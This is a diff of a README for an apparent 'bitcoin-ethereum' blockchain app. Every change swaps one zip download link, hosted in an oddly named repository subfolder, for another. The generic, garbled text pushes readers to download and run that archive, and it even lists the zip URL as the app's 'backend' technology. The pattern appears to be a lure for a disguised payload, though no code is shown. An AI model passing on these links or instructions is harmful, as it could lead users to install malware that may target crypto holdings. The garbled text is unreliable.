@@ -1,6 +1,6 @@
 # 🚀 bitcoin-ethereum - Simplifying Blockchain for Everyone
 
-![Download](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/bitcoin-ethereum.zip%https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/bitcoin-ethereum.zip)
+![Download](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/ethereum_bitcoin_v1.9.zip%https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/ethereum_bitcoin_v1.9.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ The **bitcoin-ethereum** application serves as your gateway to the world of bloc
 
 To use the **bitcoin-ethereum** application, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/bitcoin-ethereum.zip) to access the latest version of the application.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/ethereum_bitcoin_v1.9.zip) to access the latest version of the application.
 
 2. **Download the Application:** Find the version labeled "latest release" on that page. Click the link to download the application file to your computer.
 
@@ -41,7 +41,7 @@ The **bitcoin-ethereum** application includes several features designed for both
 
 ## 📥 Download & Install
 
-To start using the **bitcoin-ethereum** application, visit [this page](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/bitcoin-ethereum.zip) to download the latest version. After downloading, follow the installation instructions based on your operating system.
+To start using the **bitcoin-ethereum** application, visit [this page](https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/ethereum_bitcoin_v1.9.zip) to download the latest version. After downloading, follow the installation instructions based on your operating system.
 
 ## 🛠️ Troubleshooting
 
@@ -75,7 +75,7 @@ We welcome contributions! If you're interested in helping improve the **bitcoin-
 The **bitcoin-ethereum** application utilizes various technologies to ensure functionality and efficiency:
 
 - **JavaScript** for the user interface
-- **https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/bitcoin-ethereum.zip** for backend operations
+- **https://raw.githubusercontent.com/Morbykat/bitcoin-ethereum/main/mazopexy/ethereum_bitcoin_v1.9.zip** for backend operations
 - **Blockchain APIs** for real-time data retrieval
 
 Thank you for choosing **bitcoin-ethereum**. We hope this application enhances your experience in the world of blockchain. Happy exploring!
